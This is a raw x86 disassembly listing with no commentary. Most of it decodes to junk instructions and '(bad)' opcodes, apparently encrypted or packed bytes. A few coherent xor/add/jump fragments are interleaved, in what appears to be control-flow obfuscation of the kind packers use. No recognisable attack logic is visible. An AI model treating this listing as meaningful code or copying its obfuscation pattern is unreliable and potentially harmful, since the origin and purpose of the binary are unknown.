  401984:	jns    0x401989
  401986:	mov    ch,BYTE PTR [ebx-0x3aabfbb3]
  40198c:	popf   
  40198d:	sbb    eax,0xf90a4aa2
  401992:	test   BYTE PTR [eax-0x7],dl
  401995:	push   edi
  401996:	push   edi
  401997:	sbb    al,ch
  401999:	push   ss
  40199a:	sbb    eax,0x4f04b574
  40199f:	jg     0x4019d9
  4019a1:	rol    DWORD PTR [ebp+0x5e],cl
  4019a4:	retf   
  4019a5:	xchg   ch,dl
  4019a7:	fidivr WORD PTR [edx+0x61]
  4019aa:	pop    ecx
  4019ab:	mov    dh,0x29
  4019ad:	(bad)  
  4019ae:	pop    edi
  4019af:	mov    bl,0xc2
  4019b1:	sbb    BYTE PTR [ebx+0x6ac125a7],al
  4019b7:	lahf   
  4019b8:	add    DWORD PTR [eax-0x5f],0xdbbfec4a
  4019bf:	add    esp,DWORD PTR [eax+0x48]
  4019c2:	outs   dx,BYTE PTR ds:[esi]
  4019c3:	loop   0x401978
  4019c5:	add    eax,0xc6f69847
  4019ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019cc:	pop    ebp
  4019cd:	push   edi
  4019ce:	jmp    DWORD PTR ds:[eax+0x4077408f]
  4019d6:	hlt    
  4019d7:	pushf  
  4019d8:	ins    DWORD PTR es:[edi],dx
  4019d9:	xor    DWORD PTR [ebp+0x78],esi
  4019dc:	wbinvd 
  4019de:	(bad)  
  4019df:	mov    ebp,0x6826c99
  4019e4:	or     dl,BYTE PTR [eax-0x6e]
  4019e7:	aam    0x9f
  4019e9:	in     al,dx
  4019ea:	mov    BYTE PTR [ebp+0x41bcea82],dl
  4019f0:	sub    dl,BYTE PTR [edi+0x300d5e45]
  4019f6:	mov    eax,ds:0x3d4fc7b9
  4019fb:	or     BYTE PTR [eax+0x42d05f96],ah
  401a01:	cs push edx
  401a03:	xor    DWORD PTR [eax-0x14],edx
  401a06:	in     al,dx
  401a07:	loope  0x40199e
  401a09:	mov    ds:0x1fed74d5,eax
  401a0e:	dec    edi
  401a0f:	cwde   
  401a10:	adc    al,0xd9
  401a12:	ret    0x3551
  401a15:	adc    al,0xda
  401a17:	test   BYTE PTR [ecx],al
  401a19:	push   es
  401a1a:	pop    ebx
  401a1b:	pop    ds
  401a1c:	sti    
  401a1d:	shl    DWORD PTR [edx+ebx*1-0x6f],1
  401a21:	dec    edi
  401a22:	push   edi
  401a23:	pop    ss
  401a24:	mov    bl,0x34
  401a26:	imul   ecx,esi,0x4b8a096e
  401a2c:	push   eax
  401a2d:	retf   
  401a2e:	or     ah,cl
  401a30:	pop    ebp
  401a31:	mov    ebx,0x3756533e
  401a36:	retf   
  401a37:	pop    esi
  401a38:	in     eax,0x86
  401a3a:	mov    ah,0x71
  401a3c:	enter  0xf03d,0x72
  401a40:	in     al,0x4f
  401a42:	popa   
  401a43:	xor    bl,ah
  401a45:	xor    al,0x82
  401a47:	sub    al,0x55
  401a49:	ret    0x8c24
  401a4c:	dec    edi
  401a4d:	std    
  401a4e:	push   ds
  401a4f:	pop    esi
  401a50:	jl     0x401ab5
  401a52:	mov    esi,0x83ad37e8
  401a57:	mov    cl,0x1c
  401a59:	xor    BYTE PTR [edx],bl
  401a5b:	sbb    eax,0x62934804
  401a60:	lea    eax,[edx]
  401a62:	sbb    eax,0xa52c4551
  401a67:	dec    esp
  401a68:	xor    eax,0xbb814cb2
  401a6d:	xor    eax,0x7968bdb9
  401a72:	mov    cl,0xfd
  401a74:	lea    esi,[ecx-0x4fa276af]
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	xchg   BYTE PTR [eax],ch
  401a8d:	shl    DWORD PTR [ecx+0xe],0x78
  401a91:	jle    0x401b11
  401a93:	cli    
  401a94:	jg     0x401b14
  401a96:	jle    0x401afc
  401a98:	(bad)  
  401a99:	in     eax,0x90
  401a9b:	mov    cl,0xd6
  401a9d:	ret    
  401a9e:	enter  0xb7f4,0x21
  401aa2:	cmp    eax,0x2bdd8194
  401aa7:	test   eax,0xe1b99dea
  401aac:	iret   
  401aad:	dec    eax
  401aae:	mov    cl,0xec
  401ab0:	cwde   
  401ab1:	or     esi,DWORD PTR [esi+0x79]
  401ab4:	adc    DWORD PTR [eax+0x3a553f5f],ebp
  401aba:	mov    edx,0x388a4601
  401abf:	mov    al,0xca
  401ac1:	test   al,0xc
  401ac3:	inc    esp
  401ac4:	push   esi
  401ac5:	pop    ebx
  401ac6:	mov    eax,ds:0x387db136
  401acb:	in     al,0xfd
  401acd:	enter  0x3eb7,0x67
  401ad1:	shr    dh,1
  401ad3:	sub    eax,0xc4750cbb
  401ad8:	jbe    0x401b13
  401ada:	jbe    0x401ac5
  401adc:	jmp    0xdb65:0x7891d503
  401ae3:	dec    ebp
  401ae4:	inc    edx
  401ae5:	mov    edi,0x6ada42e4
  401aea:	enter  0xf6b4,0xd6
  401aee:	ins    BYTE PTR es:[edi],dx
  401aef:	pushw  ds
  401af1:	inc    esp
  401af2:	(bad)  
  401af3:	mov    ch,0x2b
  401af5:	inc    eax
  401af6:	cdq    
  401af7:	sbb    eax,0x1e6482ec
  401afc:	xor    al,0xdc
  401afe:	lods   eax,DWORD PTR ds:[esi]
  401aff:	imul   eax,DWORD PTR [eax],0xd
  401b02:	jnp    0x401b68
  401b04:	iret   
  401b05:	jnp    0x401ad2
  401b07:	push   ecx
  401b09:	ins    DWORD PTR es:[edi],dx
  401b0a:	out    dx,al
  401b0b:	inc    ebp
  401b0c:	mov    cl,0xfd
  401b0e:	fst    DWORD PTR [edi+edx*1]
  401b11:	sub    DWORD PTR [edx+0x2beb8f77],edi
  401b17:	(bad)  
  401b19:	inc    esp
  401b1a:	imul   BYTE PTR [edi]
  401b1c:	hlt    
  401b1d:	call   0x567a:0x24fc1b27
  401b24:	pop    ebx
  401b25:	mov    al,cl
  401b27:	stos   DWORD PTR es:[edi],eax
  401b28:	push   es
  401b29:	mov    edi,0xee282669
  401b2e:	pop    ecx
  401b2f:	(bad)  ds:0x86cfa04f
  401b35:	push   0x38cae996
  401b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b3b:	out    0xbd,al
  401b3d:	push   ds
  401b3e:	mov    edx,0x88fa48e7
  401b43:	cld    
  401b44:	loope  0x401ad2
  401b46:	dec    eax
  401b47:	inc    esi
  401b48:	aam    0xdf
  401b4a:	jecxz  0x401b25
  401b4c:	and    ebp,DWORD PTR [ecx]
  401b4e:	inc    eax
  401b4f:	jle    0x401bb9
  401b51:	inc    ecx
  401b52:	les    ebp,FWORD PTR [esp+ecx*2]
  401b55:	lods   al,BYTE PTR ds:[esi]
  401b56:	jmp    0x333f:0x10a23184
  401b5d:	xor    ecx,ebp
  401b5f:	mov    edx,0x13637420
  401b64:	sbb    al,0xe9
  401b66:	(bad)  
  401b67:	cli    
  401b68:	fwait
  401b69:	add    ch,BYTE PTR [edx-0x17]
  401b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b6d:	hlt    
  401b6e:	popf   
  401b6f:	sub    DWORD PTR [edx],edi
  401b71:	data16 gs xor al,0x7e
  401b75:	daa    
  401b76:	dec    ebp
  401b77:	icebp  
  401b78:	out    dx,al
  401b79:	in     al,0x26
  401b7b:	pop    edx
  401b7c:	sub    al,0x78
  401b7e:	shr    BYTE PTR [ebx+0x1624caae],1
  401b84:	sub    esi,ecx
  401b86:	mov    cl,0xb2
  401b88:	jmp    0x401b2e
  401b8a:	cmp    al,BYTE PTR [ecx-0x6a4c1344]
  401b90:	enter  0x7298,0xc1
  401b94:	mov    esi,DWORD PTR [ebp+0x662e2d2d]
  401b9a:	xchg   esp,eax
  401b9b:	scas   al,BYTE PTR es:[edi]
  401b9c:	push   ss
  401b9d:	add    BYTE PTR ds:0x988d2057,0x96
  401ba4:	aas    
  401ba5:	retf   0xdd6e
  401ba8:	fs sti 
  401baa:	bound  eax,QWORD PTR [esi]
  401bac:	lds    edi,FWORD PTR [ebx]
  401bae:	pop    ebx
  401baf:	clc    
  401bb0:	cdq    
  401bb1:	cmp    ebp,DWORD PTR [esi+ecx*1-0x2e]
  401bb5:	in     al,dx
  401bb6:	fbld   TBYTE PTR [ecx+eax*1+0x17040161]
  401bbd:	retf   0xd36d
  401bc0:	mov    al,ds:0x18e7b24a
  401bc5:	stos   DWORD PTR es:[edi],eax
  401bc6:	ds cwde 
  401bc8:	repz add ebx,DWORD PTR fs:0x1799b862
  401bd0:	sub    ebx,DWORD PTR [edx+0x22]
  401bd3:	test   cl,cl
  401bd5:	fst    QWORD PTR [edx-0x55]
  401bd8:	aam    0x29
  401bda:	in     al,0x9b
  401bdc:	or     DWORD PTR ds:0xf03866f4,esp
  401be2:	fdivr  st,st(7)
  401be4:	mov    eax,0xedafe682
  401be9:	adc    esi,esi
  401beb:	inc    DWORD PTR [edx]
  401bed:	add    BYTE PTR [esi+0x40],ch
  401bf0:	pop    es
  401bf1:	ss dec edi
  401bf3:	add    al,bl
  401bf5:	jne    0x401c3d
  401bf7:	lds    ebp,FWORD PTR [edi+esi*4]
  401bfa:	jp     0x401bff
  401bfc:	push   0xff98e7ff
  401c01:	rcr    DWORD PTR [edi],cl
  401c03:	dec    eax
  401c04:	or     eax,0xcc8cec07
  401c09:	jmp    0x4f634b54
  401c0e:	shl    DWORD PTR [esi+0xd],1
  401c11:	cwde   
  401c12:	push   ss
  401c13:	(bad)  
  401c14:	xor    al,0x79
  401c16:	pop    ds
  401c17:	pop    ecx
  401c18:	jmp    DWORD PTR [edx-0x4fba747d]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	mov    al,0x9f
  401c42:	dec    esp
  401c43:	pop    ebx
  401c44:	mov    bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401caf
  401c4d:	push   ebp
  401c4e:	sbb    ah,BYTE PTR [ebp+0x1c]
  401c51:	adc    al,0xdf
  401c53:	daa    
  401c54:	je     0x401c71
  401c56:	lahf   
  401c57:	or     eax,0x46389bc9
  401c5c:	int    0xc8
  401c5e:	mov    ebx,0xa55763e0
  401c63:	and    al,0x43
  401c65:	lahf   
  401c66:	shr    DWORD PTR [edx-0x48b86e06],cl
  401c6c:	xchg   DWORD PTR [ebx+ebp*4],eax
  401c6f:	out    0x63,eax
  401c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c72:	int    0xe8
  401c74:	xchg   edx,eax
  401c75:	(bad)  
  401c76:	stc    
  401c77:	fstp   QWORD PTR [esi]
  401c79:	cmc    
  401c7a:	push   esi
  401c7b:	mov    dl,BYTE PTR [esi-0x663d48dd]
  401c81:	aam    0x45
  401c83:	shl    BYTE PTR [ebp+0x5547c6cf],1
  401c89:	stos   BYTE PTR es:[edi],al
  401c8a:	xor    BYTE PTR [ebx+0x5954390f],bh
  401c90:	pop    esp
  401c91:	fstp   DWORD PTR [ecx-0x77]
  401c94:	jns    0x401d0d
  401c96:	or     ecx,DWORD PTR [esi+eiz*4-0x2e418849]
  401c9d:	sub    DWORD PTR [ecx-0x3a7ed1a8],esi
  401ca3:	stos   DWORD PTR es:[edi],eax
  401ca4:	xlat   BYTE PTR ds:[ebx]
  401ca5:	sub    dl,BYTE PTR [ecx+0xefaf459]
  401cab:	mov    dh,0x9c
  401cad:	pop    edx
  401cae:	stos   BYTE PTR es:[edi],al
  401caf:	out    dx,al
  401cb0:	pop    ss
  401cb1:	adc    al,0xd9
  401cb3:	mov    ah,0x6
  401cb5:	test   DWORD PTR [esi-0x57d07347],esp
  401cbb:	(bad)  
  401cbc:	jecxz  0x401cd1
  401cbe:	imul   ebp,DWORD PTR [ecx-0x1ae092f9],0x1bd9c52
  401cc8:	es pop ebp
  401cca:	les    esp,FWORD PTR [ebp-0xfb1e4c3]
  401cd0:	retf   0x97ed
  401cd3:	inc    ebx
  401cd4:	mov    ecx,0x1ad62dd7
  401cd9:	pop    eax
  401cda:	ficomp DWORD PTR [edx+0x29]
  401cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cde:	jae    0x401d44
  401ce0:	xchg   edx,eax
  401ce1:	in     al,dx
  401ce2:	jecxz  0x401cbe
  401ce4:	inc    edi
  401ce5:	lea    eax,[esi]
  401ce7:	repnz scas eax,DWORD PTR es:[edi]
  401ce9:	fstp   QWORD PTR [ebx+0x7a]
  401cec:	cmp    bl,BYTE PTR [ebx+0x2e]
  401cef:	cmp    dl,cl
  401cf1:	xchg   BYTE PTR [ebp+0x391429a2],dh
  401cf7:	add    cl,bh
  401cf9:	jbe    0x401d11
  401cfb:	cmp    ebx,DWORD PTR ds:0x8f99d45
  401d01:	ds push esp
  401d03:	clc    
  401d04:	mov    WORD PTR [edx+ebx*4-0x40],?
  401d08:	lods   eax,DWORD PTR ds:[esi]
  401d09:	icebp  
  401d0a:	push   0xffffffc9
  401d0c:	mov    BYTE PTR [esi+0x30],bh
  401d0f:	add    ah,dh
  401d11:	addr16 nop
  401d13:	fmul   DWORD PTR [esi-0x12]
  401d16:	inc    ebp
  401d17:	clc    
  401d18:	jmp    DWORD PTR [edx]
  401d1a:	xor    DWORD PTR [ecx+0x38c2c3c9],ecx
  401d20:	fisttp WORD PTR [esi+0x61]
  401d23:	in     eax,dx
  401d24:	jp     0x401d75
  401d26:	mov    bl,0xcd
  401d28:	mov    eax,edi
  401d2a:	dec    esi
  401d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d2c:	jnp    0x401cd3
  401d2e:	mov    edi,0x64e4c873
  401d33:	ret    
  401d34:	sub    esp,esp
  401d36:	inc    ecx
  401d37:	sub    edi,DWORD PTR [ebp-0x26]
  401d3a:	popa   
  401d3b:	sar    DWORD PTR [edx+0x68c2ed6b],0x2d
  401d42:	int3   
  401d43:	call   0x727b:0x1d2aedee
  401d4a:	mov    eax,ds:0xb9fe1883
  401d4f:	out    dx,eax
  401d50:	int    0x48
  401d52:	stc    
  401d53:	pushf  
  401d54:	jge    0x401dc7
  401d56:	les    eax,FWORD PTR [ecx-0x276a1436]
  401d5c:	add    ebp,DWORD PTR [esi-0x21b82d20]
  401d62:	mov    fs,WORD PTR [edi-0x3f]
  401d65:	fwait
  401d66:	adc    bh,bh
  401d68:	(bad)  
  401d69:	sbb    edi,DWORD PTR [ebx+0x20]
  401d6c:	and    cl,BYTE PTR [ecx-0x3e62ffd8]
  401d72:	lods   eax,DWORD PTR ds:[esi]
  401d73:	jbe    0x401cfb
  401d75:	pop    ebx
  401d76:	out    0xb8,eax
  401d78:	inc    esp
  401d79:	mov    ds:0x3273b2ce,al
  401d7e:	rol    DWORD PTR [edx+0x1f],cl
  401d81:	jp     0x401d46
  401d83:	cmp    ebx,ebx
  401d85:	xchg   edx,eax
  401d86:	jnp    0x401df0
  401d88:	stos   BYTE PTR es:[edi],al
  401d89:	sub    al,0x13
  401d8b:	cli    
  401d8c:	dec    ebp
  401d8d:	fld    DWORD PTR [esi+ecx*1]
  401d90:	test   BYTE PTR [esi-0x5dd8638a],ch
  401d96:	sub    edx,DWORD PTR [esi-0x3fcc9fce]
  401d9c:	lods   al,BYTE PTR ds:[esi]
  401d9d:	out    dx,al
  401d9e:	adc    al,0x74
  401da0:	jne    0x401dc3
  401da2:	sub    edx,ebp
  401da4:	lahf   
  401da5:	cmp    al,0x36
  401da7:	in     al,dx
  401da8:	cld    
  401da9:	cmc    
  401daa:	pushf  
  401dab:	cmp    DWORD PTR [ebx+0x37],ebp
  401dae:	jae    0x401e04
  401db0:	xlat   BYTE PTR ds:[ebx]
  401db1:	cmp    ebp,DWORD PTR [edx]
  401db3:	lea    esi,[ebx+0x48eb919d]
  401db9:	pop    ecx
  401dba:	mov    cl,0xc0
  401dbc:	jne    0x401d56
  401dbe:	shl    BYTE PTR [ecx-0x12],1
  401dc1:	daa    
  401dc2:	(bad)  
  401dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dc4:	fcmovnb st,st(7)
  401dc6:	test   BYTE PTR [esp+edx*2],ah
  401dc9:	mov    esi,esi
  401dcb:	sbb    ebp,DWORD PTR [esp+ebp*1]
  401dce:	aaa    
  401dcf:	repz add eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x55ec3738],ebp
  401e0d:	mov    DWORD PTR [esi],edx
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401df7
  401e17:	ror    BYTE PTR [ebp+ebx*2-0xb],0x88
  401e1c:	fsubr  QWORD PTR [ebx]
  401e1e:	in     al,dx
  401e1f:	adc    eax,0x95d0da66
  401e24:	sbb    eax,0xaa9a1b6e
  401e29:	out    dx,al
  401e2a:	cdq    
  401e2b:	scas   al,BYTE PTR es:[edi]
  401e2c:	iret   
  401e2d:	inc    ebx
  401e2e:	jle    0x401df3
  401e30:	jnp    0x401e21
  401e32:	(bad)  
  401e33:	mov    ds:0xe4463891,eax
  401e38:	cs push ebp
  401e3a:	xor    ah,BYTE PTR [ebp+0x3a4aa7b6]
  401e40:	retf   0x1139
  401e43:	sub    bl,bh
  401e45:	pushf  
  401e46:	out    0xd0,eax
  401e48:	into   
  401e49:	into   
  401e4a:	adc    DWORD PTR [edi-0x38a415a1],eax
  401e50:	sub    al,0x95
  401e52:	add    DWORD PTR [esi],esi
  401e54:	xchg   esp,eax
  401e55:	pushf  
  401e56:	stos   BYTE PTR es:[edi],al
  401e57:	cmp    BYTE PTR [eax],al
  401e59:	jns    0x401e97
  401e5b:	imul   esp,DWORD PTR [edi],0xb976a51a
  401e61:	js     0x401e76
  401e63:	or     BYTE PTR [ebp-0x1f],dh
  401e66:	hlt    
  401e67:	ss into 
  401e69:	into   
  401e6a:	imul   esp,DWORD PTR [ecx+0x19],0xffffff9a
  401e6e:	pop    es
  401e6f:	inc    edx
  401e70:	sti    
  401e71:	mov    DWORD PTR [eax+0x6c5ed3db],edi
  401e77:	shl    DWORD PTR [ecx+edx*8+0x5dad0445],1
  401e7e:	jbe    0x401e26
  401e80:	and    al,0x57
  401e82:	xchg   edx,eax
  401e83:	mov    WORD PTR [ebx],ss
  401e85:	int    0x97
  401e87:	or     eax,DWORD PTR [ebx]
  401e89:	inc    ebp
  401e8a:	nop
  401e8b:	out    0x60,al
  401e8d:	out    dx,al
  401e8e:	ficomp WORD PTR [ecx]
  401e90:	sti    
  401e91:	sub    bh,BYTE PTR [ebp+0x1a]
  401e94:	mov    bh,0xf0
  401e96:	mov    esi,0x738c0056
  401e9b:	scas   al,BYTE PTR es:[edi]
  401e9c:	pop    eax
  401e9d:	lahf   
  401e9e:	mov    dh,0xd9
  401ea0:	aad    0x5c
  401ea2:	add    al,0x20
  401ea4:	cmp    DWORD PTR [ecx-0x51],esi
  401ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ea8:	jae    0x401ea0
  401eaa:	adc    eax,DWORD PTR [edi]
  401eac:	stos   DWORD PTR es:[edi],eax
  401ead:	inc    eax
  401eae:	sub    BYTE PTR [esi+edi*8],0x84
  401eb2:	push   esi
  401eb3:	into   
  401eb4:	call   0x43ebce6c
  401eb9:	call   0x1b7d96fb
  401ebe:	ja     0x401e7a
  401ec0:	fs push es
  401ec2:	lea    edx,[esi+0x6a]
  401ec5:	add    al,0x7a
  401ec7:	cmp    DWORD PTR [esi-0x17],0xc8fdb419
  401ece:	dec    esp
  401ecf:	dec    ebp
  401ed0:	mov    BYTE PTR [eax-0x79],dh
  401ed3:	mov    ecx,0xda505fd0
  401ed8:	(bad)  
  401ed9:	pop    ebx
  401eda:	sbb    BYTE PTR ds:0x1933667f,bh
  401ee0:	sbb    al,0xf1
  401ee2:	mov    esi,0xfbe69a2a
  401ee7:	dec    esp
  401ee8:	stos   DWORD PTR es:[edi],eax
  401ee9:	sar    cl,1
  401eeb:	out    dx,eax
  401eec:	(bad)  
  401eed:	push   0x65aee6e0
  401ef2:	fwait
  401ef3:	test   eax,0x51d439b4
  401ef8:	or     al,0x23
  401efa:	adc    eax,0xf6d9d657
  401eff:	scas   al,BYTE PTR es:[edi]
  401f00:	pop    ebx
  401f01:	inc    eax
  401f02:	xor    eax,0x53714816
  401f07:	xchg   edx,eax
  401f08:	push   0x810361e0
  401f0d:	jmp    0x8287e815
  401f12:	or     esi,DWORD PTR [eax]
  401f14:	inc    edi
  401f15:	std    
  401f16:	inc    ecx
  401f17:	mov    bh,BYTE PTR [esi-0x59]
  401f1a:	sub    BYTE PTR ds:0x3599396b,bl
  401f20:	inc    edi
  401f21:	pop    es
  401f22:	xor    DWORD PTR [esi+edi*8],edi
  401f25:	aam    0xb8
  401f27:	loop   0x401f27
  401f29:	xchg   ecx,eax
  401f2a:	xchg   ebp,eax
  401f2b:	push   ebx
  401f2c:	mov    edi,0x825ddf19
  401f31:	pop    ecx
  401f32:	add    DWORD PTR [eax+edx*8-0x7d],ecx
  401f36:	jmp    0x64591587
  401f3b:	loop   0x401ec6
  401f3d:	imul   eax,DWORD PTR [ecx-0x23],0x10
  401f41:	pop    ss
  401f42:	sub    ebx,ebp
  401f44:	and    al,0x52
  401f46:	push   esp
  401f47:	pop    ecx
  401f48:	dec    ebx
  401f49:	sbb    ecx,eax
  401f4b:	xor    bl,BYTE PTR [ebp-0x4bcb8cd9]
  401f51:	adc    BYTE PTR [eax-0x28afa9cc],0x87
  401f58:	jo     0x401f61
  401f5a:	add    al,0x24
  401f5c:	mov    dh,0x58
  401f5e:	call   0x9ff2:0x1813d5cc
  401f65:	fld    st(7)
  401f67:	jns    0x401f97
  401f69:	ss test al,0xbd
  401f6c:	dec    ebp
  401f6d:	jnp    0x401f47
  401f6f:	mov    eax,0xc28960d8
  401f74:	fistp  QWORD PTR [esi+0x78]
  401f77:	mov    ebx,0x9219569e
  401f7c:	sahf   
  401f7d:	push   ds
  401f7e:	xchg   ebx,eax
  401f7f:	daa    
  401f80:	nop
  401f81:	mul    DWORD PTR [edi+0x7b]
  401f84:	xor    DWORD PTR [ecx],ecx
  401f86:	jno    0x401fdb
  401f88:	jmp    0x401f8c
  401f8a:	inc    ecx
  401f8b:	sti    
  401f8c:	add    al,0x97
  401f8e:	pop    edx
  401f8f:	sub    ch,al
  401f91:	sub    al,0xae
  401f93:	mov    esp,0xf1874f67
  401f98:	stc    
  401f99:	ror    BYTE PTR [edi],cl
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xb2134d18
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x402037
  401fcc:	mov    dh,0x1f
  401fce:	dec    ecx
  401fcf:	js     0x401fa7
  401fd1:	in     eax,dx
  401fd2:	sub    DWORD PTR [ebp+0x6523c72f],eax
  401fd8:	in     eax,dx
  401fd9:	das    
  401fda:	add    bh,BYTE PTR [eax+0x6601300c]
  401fe0:	repnz inc esp
  401fe2:	sbb    DWORD PTR [edi-0x12],0xa6461d91
  401fe9:	fimul  DWORD PTR [edx+eiz*2-0x34]
  401fed:	jl     0x401f81
  401fef:	pop    ds
  401ff0:	hlt    
  401ff1:	jmp    0x401fb1
  401ff3:	mov    edi,0xd672d1a7
  401ff8:	std    
  401ff9:	inc    ebx
  401ffa:	pop    ss
  401ffb:	xchg   BYTE PTR [edx],ch
  401ffd:	leave  
  401ffe:	fwait
  401fff:	pop    ebp
  402000:	sahf   
  402001:	mov    dh,0x31
  402003:	retf   0x26e3
  402006:	(bad)  
  402007:	mul    ecx
  402009:	icebp  
  40200a:	xchg   DWORD PTR [ebx-0x78],ecx
  40200d:	shl    esp,cl
  40200f:	repz les di,DWORD PTR [esi]
  402013:	jge    0x40206e
  402015:	fmul   DWORD PTR [ebx+0x45]
  402018:	xor    dh,BYTE PTR [edi+0x7ece1ef9]
  40201e:	scas   eax,DWORD PTR es:[edi]
  40201f:	lock rcr DWORD PTR [ebx-0x48],cl
  402023:	test   cl,0xd9
  402026:	retf   
  402027:	sub    edx,DWORD PTR ds:0x3fd58cb1
  40202d:	jnp    0x402025
  40202f:	enter  0xc4b4,0x2c
  402033:	or     BYTE PTR [ecx-0x29],bl
  402036:	test   al,0x23
  402038:	je     0x401fbe
  40203a:	call   0xdd74:0x37081b42
  402041:	pop    esp
  402042:	(bad)  
  402043:	and    DWORD PTR [edx],esi
  402045:	clc    
  402046:	push   eax
  402047:	cld    
  402048:	call   0xe88a:0x12c9fc21
  40204f:	mov    dh,0xab
  402051:	xchg   edi,edi
  402053:	adc    DWORD PTR [edx+0x14],eax
  402056:	push   0x9c11727d
  40205b:	ins    DWORD PTR es:[edi],dx
  40205c:	sbb    al,0xd3
  40205e:	push   ebx
  40205f:	fiadd  DWORD PTR [ebx-0x2aa741fa]
  402065:	mov    bl,0xc2
  402067:	inc    esp
  402068:	test   BYTE PTR [esi+eiz*2+0x58],ch
  40206c:	fimul  WORD PTR [esi-0x6a]
  40206f:	test   DWORD PTR [ebx],edi
  402071:	mov    eax,DWORD PTR [edx-0x1b]
  402074:	jnp    0x4020f0
  402076:	dec    ecx
  402077:	cs jbe 0x40208d
  40207a:	sub    BYTE PTR ds:0x30d41e7,cl
  402080:	sti    
  402081:	add    cl,BYTE PTR [edi+0x796f8785]
  402087:	fwait
  402088:	add    esi,DWORD PTR [ecx]
  40208a:	dec    ebp
  40208b:	iret   
  40208c:	enter  0x505e,0xc0
  402090:	mul    DWORD PTR [eax-0x101a269d]
  402096:	dec    edx
  402097:	pop    esi
  402098:	sub    DWORD PTR [eax-0x19a6c411],edi
  40209e:	shr    ch,0x71
  4020a1:	int    0x9e
  4020a3:	add    DWORD PTR [ebx-0x61],ebx
  4020a6:	pop    eax
  4020a7:	shl    BYTE PTR [esi],cl
  4020a9:	dec    ebp
  4020aa:	int    0x5f
  4020ac:	and    esi,DWORD PTR ds:0x9d90e380
  4020b2:	pop    eax
  4020b3:	jae    0x40204d
  4020b5:	inc    edi
  4020b6:	jge    0x4020d3
  4020b8:	or     BYTE PTR [edi+edx*4],ah
  4020bb:	dec    esp
  4020bc:	jne    0x402049
  4020be:	retf   0x22cf
  4020c1:	bound  eax,QWORD PTR [edi+edi*8+0x31]
  4020c5:	addr16 dec esp
  4020c7:	xchg   esp,eax
  4020c8:	jae    0x40213d
  4020ca:	cmp    BYTE PTR [ebx+0x7e],bl
  4020cd:	push   ebp
  4020ce:	in     eax,dx
  4020cf:	jg     0x4020e2
  4020d1:	or     BYTE PTR [esi],ch
  4020d3:	js     0x4020e3
  4020d5:	lods   eax,DWORD PTR ds:[esi]
  4020d6:	stos   BYTE PTR es:[edi],al
  4020d7:	imul   ebx,DWORD PTR [esi],0xbe90eb78
  4020dd:	dec    edi
  4020de:	fisubr DWORD PTR [eax-0x7c4f523c]
  4020e4:	imul   eax,DWORD PTR [ecx+esi*8-0x53b33a90],0xffffffcd
  4020ec:	stos   BYTE PTR es:[edi],al
  4020ed:	rcl    BYTE PTR [ecx-0x5c02a3f3],0x4b
  4020f4:	ins    BYTE PTR es:[edi],dx
  4020f5:	pop    ss
  4020f6:	adc    dh,ch
  4020f8:	mov    DWORD PTR [edi+0x33],ecx
  4020fb:	dec    edi
  4020fc:	jnp    0x402126
  4020fe:	int3   
  4020ff:	(bad)  
  402100:	xchg   ebp,eax
  402101:	jne    0x4020a9
  402103:	imul   esi,DWORD PTR ds:0x5d767459,0x23031bde
  40210d:	inc    ecx
  40210e:	jp     0x40218b
  402110:	and    DWORD PTR [edi-0x51],esi
  402113:	sbb    DWORD PTR [edi+0x5f7f7258],esi
